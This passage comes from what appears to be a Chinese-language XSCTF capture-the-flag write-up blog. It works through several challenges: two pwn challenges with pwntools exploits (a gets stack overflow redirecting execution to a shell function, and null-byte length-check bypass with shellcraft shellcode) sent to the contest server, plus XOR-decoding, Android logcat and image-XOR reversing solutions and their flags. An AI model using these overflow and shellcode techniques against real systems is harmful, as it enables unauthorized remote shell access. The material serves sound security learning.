class="built_in">puts</span>(&amp;byte_402158);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v10 &gt; <span class="number">8</span> || v10 &lt;= <span class="number">5</span> || (<span class="keyword">int</span>)hard() &lt;= <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v10 == <span class="number">9</span> &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)hell() != <span class="number">666</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">        win(userout, v10);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        RandomMove = getRandomMove();</span><br><span class="line">        <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">        <span class="keyword">if</span> ( RandomMove == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_402037);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( RandomMove &lt;= <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( RandomMove )</span><br><span class="line">            <span class="built_in">puts</span>(&amp;byte_40203E);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(&amp;s2);</span><br><span class="line">        &#125;</span><br><span class="line">        v6 = determineWinner(userout, RandomMove);</span><br><span class="line">        <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_4021A7);</span><br><span class="line">          ++v10;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v6 == <span class="number">-1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_402054);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_402073);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(&amp;byte_402061, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v10);</span><br><span class="line">        ++v9;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)hard() &lt;= <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      bewin(userout, v10);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">final</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中final函数就是最终的shell，而gets函数存在漏洞，可以使用栈溢出将当前函数的返回地址覆盖为final函数的返回地址<br>但是传输的payload需要符合一定条件<br>因为程序对输入进行了检查，输入的字符串必须是石头剪刀布的一种<br>这种情况下可以用%00作为payload，即输入石头的编码后加上%00，这样程序在处理字符串时遇到%00就会认为已经到字符串末尾了，而实际的payload会全部传输到内存中</p><blockquote><p>中文在C语言中使用utf-8编码，一个中文字符占用三个字节<br>在构造payload时要注意端序，例如“石头”的utf-8编码是<code>E79FB3E5A4B4</code>但是实际传输时是<code>p64(0xe5b39fe7)+p64(0xb4a4)</code></p></blockquote><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./rock_paper_scissors&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;43.248.97.213&#x27;</span>, <span class="number">30480</span>)</span><br><span class="line"><span class="comment"># print(list(p64(0xe5b39fe7)+p64(0xb4a4)))</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(p64(<span class="number">0xe5b39fe7</span>)+p64(<span class="number">0xb4a4</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x4012db</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;1bab71b8-117f-4dea-a047-340b72101d7b&#125;</code></p><h2 id="toolong"><a href="#toolong" class="headerlink" title="toolong"></a>toolong</h2><p><code>一个字节能解决的shellcode，就不要用两个字节！</code></p><p>程序两次接收用户输入，其中第二次应该输入shellcode，之后程序会将用户输入的shellcode直接执行，但是题目限制了输入shellcode的长度（24）</p><p>题目给的可执行文件反汇编失败，估计是将字符串地址作为函数地址直接调用导致的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">.text:000055A4CE79820E ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:000055A4CE79820E public main</span><br><span class="line">.text:000055A4CE79820E main proc near                          ; DATA XREF: _start+18↑o</span><br><span class="line">.text:000055A4CE79820E</span><br><span class="line">.text:000055A4CE79820E s&#x3D; byte ptr -150h</span><br><span class="line">.text:000055A4CE79820E buf&#x3D; byte ptr -50h</span><br><span class="line">.text:000055A4CE79820E var_8&#x3D; dword ptr -8</span><br><span class="line">.text:000055A4CE79820E var_4&#x3D; dword ptr -4</span><br><span class="line">.text:000055A4CE79820E</span><br><span class="line">.text:000055A4CE79820E ; __unwind &#123; &#x2F;&#x2F; 55A4CE797000</span><br><span class="line">.text:000055A4CE79820E endbr64</span><br><span class="line">.text:000055A4CE798212 push    rbp</span><br><span class="line">.text:000055A4CE798213 mov     rbp, rsp</span><br><span class="line">.text:000055A4CE798216 sub     rsp, 150h</span><br><span class="line">.text:000055A4CE79821D mov     eax, 0</span><br><span class="line">.text:000055A4CE798222 call    init</span><br><span class="line">.text:000055A4CE798227 mov     [rbp+var_8], 1</span><br><span class="line">.text:000055A4CE79822E lea     rax, s                          ; &quot;Welcome to XSCTF&quot;</span><br><span class="line">.text:000055A4CE798235 mov     rdi, rax                        ; s</span><br><span class="line">.text:000055A4CE798238 call    _puts</span><br><span class="line">.text:000055A4CE79823D lea     rax, [rbp+buf]</span><br><span class="line">.text:000055A4CE798241 mov     edx, 81                         ; nbytes</span><br><span class="line">.text:000055A4CE798246 mov     rsi, rax                        ; buf</span><br><span class="line">.text:000055A4CE798249 mov     edi, 0                          ; fd</span><br><span class="line">.text:000055A4CE79824E call    _read</span><br><span class="line">.text:000055A4CE798253 lea     rax, aInputYourMagic            ; &quot;input your magic code:&quot;</span><br><span class="line">.text:000055A4CE79825A mov     rdi, rax                        ; s</span><br><span class="line">.text:000055A4CE79825D call    _puts</span><br><span class="line">.text:000055A4CE798262 lea     rax, [rbp+s]</span><br><span class="line">.text:000055A4CE798269 mov     edx, 256                        ; nbytes</span><br><span class="line">.text:000055A4CE79826E mov     rsi, rax                        ; buf</span><br><span class="line">.text:000055A4CE798271 mov     edi, 0                          ; fd</span><br><span class="line">.text:000055A4CE798276 call    _read</span><br><span class="line">.text:000055A4CE79827B mov     [rbp+var_4], eax</span><br><span class="line">.text:000055A4CE79827E cmp     [rbp+var_4], 0</span><br><span class="line">.text:000055A4CE798282 jg      short loc_55A4CE79828B</span><br><span class="line">.text:000055A4CE798284 mov     eax, 0</span><br><span class="line">.text:000055A4CE798289 jmp     short locret_55A4CE7982DE</span><br><span class="line">.text:000055A4CE79828B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000055A4CE79828B</span><br><span class="line">.text:000055A4CE79828B loc_55A4CE79828B:                       ; CODE XREF: main+74↑j</span><br><span class="line">.text:000055A4CE79828B lea     rax, [rbp+s]</span><br><span class="line">.text:000055A4CE798292 mov     rdi, rax                        ; s</span><br><span class="line">.text:000055A4CE798295 call    _strlen</span><br><span class="line">.text:000055A4CE79829A mov     edx, [rbp+var_8]</span><br><span class="line">.text:000055A4CE79829D movsxd  rdx, edx</span><br><span class="line">.text:000055A4CE7982A0 cmp     rax, rdx</span><br><span class="line">.text:000055A4CE7982A3 ja      short loc_55A4CE7982BA</span><br><span class="line">.text:000055A4CE7982A5 lea     rax, [rbp+s]</span><br><span class="line">.text:000055A4CE7982AC mov     rdi, rax                        ; s</span><br><span class="line">.text:000055A4CE7982AF call    _strlen</span><br><span class="line">.text:000055A4CE7982B4 cmp     rax, 24</span><br><span class="line">.text:000055A4CE7982B8 jbe     short loc_55A4CE7982D0</span><br><span class="line">.text:000055A4CE7982BA</span><br><span class="line">.text:000055A4CE7982BA loc_55A4CE7982BA:                       ; CODE XREF: main+95↑j</span><br><span class="line">.text:000055A4CE7982BA lea     rax, aTooLong                   ; &quot;too long!&quot;</span><br><span class="line">.text:000055A4CE7982C1 mov     rdi, rax                        ; s</span><br><span class="line">.text:000055A4CE7982C4 call    _puts</span><br><span class="line">.text:000055A4CE7982C9 mov     eax, 0</span><br><span class="line">.text:000055A4CE7982CE jmp     short locret_55A4CE7982DE</span><br><span class="line">.text:000055A4CE7982D0 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000055A4CE7982D0</span><br><span class="line">.text:000055A4CE7982D0 loc_55A4CE7982D0:                       ; CODE XREF: main+AA↑j</span><br><span class="line">.text:000055A4CE7982D0 lea     rax, [rbp+s]</span><br><span class="line">.text:000055A4CE7982D7 call    rax</span><br><span class="line">.text:000055A4CE7982D9 mov     eax, 0</span><br><span class="line">.text:000055A4CE7982DE</span><br><span class="line">.text:000055A4CE7982DE locret_55A4CE7982DE:                    ; CODE XREF: main+7B↑j</span><br><span class="line">.text:000055A4CE7982DE                                         ; main+C0↑j</span><br><span class="line">.text:000055A4CE7982DE leave</span><br><span class="line">.text:000055A4CE7982DF retn</span><br><span class="line">.text:000055A4CE7982DF ; &#125; &#x2F;&#x2F; starts at 55A4CE79820E</span><br><span class="line">.text:000055A4CE7982DF main endp</span><br></pre></td></tr></table></figure><p>值得注意的点是程序接收了两次用户输入<br>而在接收了两次输入之后程序会对输入进行两次检查</p><ol><li>在调用read函数之后，程序使用strlen函数将输入的长度存储在rax中，接着程序会将rax与栈上的一个值进行比较，如果rax大于该值就不会执行shellcode</li><li>第二次是与一个固定值（24）比较，如果大于这个值就不会执行shellcode</li></ol><p>其中第一次栈上的值其实可以通过第一次的输入修改，这样就可以绕过这次比较<br>而第二次的比较需要在写入的payload中使用%00作为分隔符，分开正常输入和shellcode</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./toolong&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;43.248.97.213&quot;</span>, <span class="number">30510</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;z&#x27;</span>*<span class="number">80</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh()) + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendline(p64(<span class="number">0x1234</span>)+shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;qy_7t11_y0u_th4t_y0ur_p4yl0ad_15_to0_lon9&#125;</code></p><h2 id="Lets-go-to-xor"><a href="#Lets-go-to-xor" class="headerlink" title="Lets_go_to_xor"></a>Lets_go_to_xor</h2><p><code>只是一个超级Eazzzzzzzzzzy的Go程序,Let&#39;s Go!</code></p><p>使用golang编写编译的可执行文件<br><strong>其主函数在<code>main.main</code>中</strong></p><p>进入<code>main.main</code>找到<code>main.decode</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall main_decode@&lt;rax&gt;()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+12h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( v1 != qword_C86F18 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; (__int64)v1 &gt; (__int64)i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v1 )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)((__int64)i % <span class="number">10</span>) &gt;= <span class="number">0xA</span> )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v1 )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    *(_BYTE *)(v0 + i) = aIL0veCtf[(__int64)i % <span class="number">10</span>] ^ *(_BYTE *)(i + v0);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v1 )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    <span class="keyword">if</span> ( qword_C86F18 &lt;= i )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)main_enc + i) != *(_BYTE *)(i + v0) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然和C语言不太一样，但是还是可以勉强看出来逻辑，大概就是下面这个意思</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0L</span>L; (__int64)v1 &gt; (__int64)i; ++i )</span><br><span class="line">    *(_BYTE *)(v0 + i) = aIL0veCtf[(__int64)i % <span class="number">10</span>] ^ *(_BYTE *)(i + v0);</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)main_enc + i) != *(_BYTE *)(i + v0) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>找到<code>main_enc</code>和<code>aIL0veCtf</code>，提取数据，将<code>main_enc</code>与<code>aIL0veCtf</code>循环异或就可以得到flag</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&#x27;i_l0ve_CtF&#x27;</span></span><br><span class="line">s = [<span class="number">0x0F</span>, <span class="number">0x33</span>, <span class="number">0x0D</span>, <span class="number">0x57</span>, <span class="number">0x0D</span>, <span class="number">0x3D</span>, <span class="number">0x0C</span>, <span class="number">0x14</span>, <span class="number">0x38</span>, <span class="number">0x0E</span>, <span class="number">0x21</span>, <span class="number">0x17</span>, <span class="number">0x33</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x3A</span>, <span class="number">0x0F</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x19</span>, <span class="number">0x24</span>, <span class="number">0x6B</span>, <span class="number">0x1F</span>, <span class="number">0x64</span>, <span class="number">0x13</span>, <span class="number">0x17</span>, <span class="number">0x22</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    print(<span class="built_in">chr</span>((s[i]^<span class="built_in">ord</span>(key[i%<span class="number">10</span>]))&amp;<span class="number">0xff</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>flag&#123;XSWLHHH_1s_Pwn_M4sTer&#125;</code></p><h2 id="loglistening"><a href="#loglistening" class="headerlink" title="loglistening"></a>loglistening</h2><p>题目下发一个安装包<br>jadx打开看到如下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.loglistening;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> com.example.loglistening.databinding.ActivityMainBinding;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> ActivityMainBinding binding;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">fasheng</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;loglistening&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());</span><br><span class="line">        <span class="keyword">this</span>.binding = inflate;</span><br><span class="line">        setContentView((View) inflate.getRoot());</span><br><span class="line">        ((Button) findViewById(C0587R.C0590id.button1)).setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;好像有什么事情在native层发生了!&quot;</span>);</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.fasheng();</span><br><span class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>.getApplicationContext(), <span class="string">&quot;flag已经生成了！&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是通过native层的代码生成的flag<br>找到so文件扔进ida，找到flag的生成代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">Java_com_example_loglistening_MainActivity_fasheng</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  md5(<span class="string">&quot;stardustduststar&quot;</span>, v1);</span><br><span class="line">  __android_log_print(<span class="number">4L</span>L, <span class="string">&quot;xilo&quot;</span>, <span class="string">&quot;flag&#123;%s&#125;&quot;</span>, v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按道理说把字符串md5之后就可以得到flag了，但是失败了</p><p>看到log字样，直接查日志</p><ul><li>模拟器开启开发者选项</li><li>adb devices确认连接成功</li><li>输入<code>adb logcat -v time&gt;D:log.txt</code>开始抓取日志，期间打开软件点击按钮生成flag</li><li>然后返回命令行Ctrl+C完成抓取</li><li>找到log.txt查看日志<del>（虽然命令写的在D盘，但是实际上是在当前目录）</del></li></ul><p><code>flag&#123;4724110e8c8a83c123d6df82efee8c53&#125;</code></p><h2 id="picchange"><a href="#picchange" class="headerlink" title="picchange"></a>picchange</h2><p><code>输入数字即可得到flag哦</code></p><p>一开始想的是直接扔进ida反编译然后看对图像的加密逻辑，也就是下面的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_7FF6B8023C20</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *Stream; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line">  FILE *Streama; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="keyword">void</span> *Buffer; <span class="comment">// [rsp+68h] [rbp+48h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line"></span><br><span class="line">  sub_7FF6B80213C0(&amp;unk_7FF6B8036017);</span><br><span class="line">  Stream = fopen(a1, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( Stream )</span><br><span class="line">  &#123;</span><br><span class="line">    fseek(Stream, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">    v4 = ftell(Stream);</span><br><span class="line">    fseek(Stream, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    Buffer = <span class="built_in">malloc</span>(v4);</span><br><span class="line">    <span class="keyword">if</span> ( Buffer )</span><br><span class="line">    &#123;</span><br><span class="line">      fread(Buffer, <span class="number">1u</span>i64, v4, Stream);</span><br><span class="line">      fclose(Stream);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">        *((_BYTE *)Buffer + i) ^= strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)(i % <span class="number">32</span> + a2), <span class="number">0</span>i64, <span class="number">16</span>);</span><br><span class="line">      Streama = fopen(<span class="string">&quot;picc_xor.png&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( Streama )</span><br><span class="line">      &#123;</span><br><span class="line">        fwrite(Buffer, <span class="number">1u</span>i64, v4, Streama);</span><br><span class="line">        fclose(Streama);</span><br><span class="line">        <span class="built_in">free</span>(Buffer);</span><br><span class="line">        sub_7FF6B80211CC(&amp;unk_7FF6B802CFB8);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        perror(&amp;byte_7FF6B802CFA8);</span><br><span class="line">        <span class="built_in">free</span>(Buffer);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      perror(&amp;byte_7FF6B802CF80);</span><br><span class="line">      fclose(Stream);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    perror(&amp;ErrMsg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到是对图像文件的每一个字节都进行了异或运算，但是异或的对象是不确定的<br>在交叉引用到最原始的变量以及动态调试之后得出结论：使用的是输入的三位数字的md5值作为key，对图像文件进行循环异或的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Stack[00001C64]:0000003589DCF5A8 db  32h ; 2</span><br><span class="line">Stack[00001C64]:0000003589DCF5A9 db  30h ; 0</span><br><span class="line">Stack[00001C64]:0000003589DCF5AA db  32h ; 2</span><br><span 